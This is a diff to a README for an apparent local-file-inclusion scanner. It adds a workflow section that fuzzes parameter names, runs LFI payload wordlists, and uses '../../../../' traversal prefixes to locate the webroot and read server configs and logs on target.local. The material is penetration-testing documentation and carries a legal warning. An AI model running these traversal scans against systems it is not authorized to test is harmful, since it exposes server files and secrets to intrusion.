@@ -63,6 +63,59 @@ lofi-scanner \
   --param-wordlist params.txt \
 ```
 
+
+## Automated scanning workflow (parameter + payload + file discovery)
+
+You can now automate the full sequence: discover parameters, run LFI payload corpora, and pivot to server-file discovery with custom wordlists.
+
+### 1) Fuzz parameter names
+
+```bash
+lofi-scanner \
+  --url "http://target.local/index.php" \
+  --param-wordlist /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  --method GET \
+  --output report.params.json
+```
+
+### 2) Test common LFI payloads for discovered params
+
+```bash
+lofi-scanner \
+  --url "http://target.local/index.php" \
+  --param "language" \
+  --payload-wordlist /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  --method GET \
+  --output report.lfi.json
+```
+
+### 3) Fuzz webroot candidates (append `/index.php`)
+
+```bash
+lofi-scanner \
+  --url "http://target.local/index.php" \
+  --param "language" \
+  --payload-wordlist /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt \
+  --payload-prefix "../../../../" \
+  --payload-suffix "/index.php" \
+  --method GET \
+  --output report.webroot.json
+```
+
+### 4) Fuzz server configs/logs with path prefixing
+
+```bash
+lofi-scanner \
+  --url "http://target.local/index.php" \
+  --param "language" \
+  --payload-wordlist ./LFI-WordList-Linux \
+  --payload-prefix "../../../../" \
+  --method GET \
+  --output report.files.json
+```
+
+`--payload-wordlist` entries are newline-delimited (comments starting with `#` are ignored). Use `--payload-prefix`/`--payload-suffix` to transform each entry into the exact payload style required by the target application.
+
 ## Exploit mode example (legal warning)
 
 > ⚠️ **Legal warning:** exploit mode must only be used against systems you are explicitly authorized to test.
